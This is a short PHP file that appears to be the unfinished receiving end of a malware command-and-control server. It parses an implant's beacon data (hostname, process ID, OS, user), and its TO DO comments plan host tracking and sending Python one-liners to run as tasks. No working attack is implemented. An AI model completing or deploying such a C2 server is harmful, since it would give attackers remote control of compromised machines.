<?php
    include "connector.php";

    # JSON decodes implant POST data
    $post_data = json_decode(file_get_contents("php://input"), true);

    $hostname = $post_data["hostname"];
    $process_id = $post_data["process_id"];
    $os = $post_data["os"];
    $current_user = $post_data["current_user"];

    # TO DO: Check if old or new beaconing host

    # TO DO: If new host, check for tasking

    # TO DO: If tasking, echo appropriate Python one-liner code to do the task
?>
